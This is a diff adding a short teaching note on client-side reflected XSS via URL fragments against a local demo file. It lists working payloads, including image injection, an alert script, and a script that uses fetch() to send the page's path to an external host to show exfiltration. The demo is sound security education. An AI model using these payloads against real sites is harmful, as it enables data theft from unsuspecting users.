@@ -1,0 +1,27 @@
+Client side reflected XSS. Using fragments.
+
+File in use: secret_location_ex1.html
+
+Directly open file in Chrome: Ctrl + O
+
+You'll be visiting something like: file:///home/sahil/secret_location_ex1.html
+Enter fragment and refresh to use.
+For example: file:///home/sahil/secret_location_ex1.html#blah
+
+-------------------
+
+Show usage of following fragments:
+
+Simple usage:
+	#blah
+
+Load arbitrary images:
+	#<img%20src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
+
+Pop up alert box:
+	#<script>alert(1)</script>
+
+Leak secret location of our file to external server. Main motive is to show how to ex-filtrate data:
+	#<script>fetch('https://sahilsihag.github.io?secret='+location.pathname)</script>
+	
+	Here you can show outgoing network request from "Networks" tab in dev tools. Unfortunately, I don't have a running webserver where I can show the filename being received by the server.
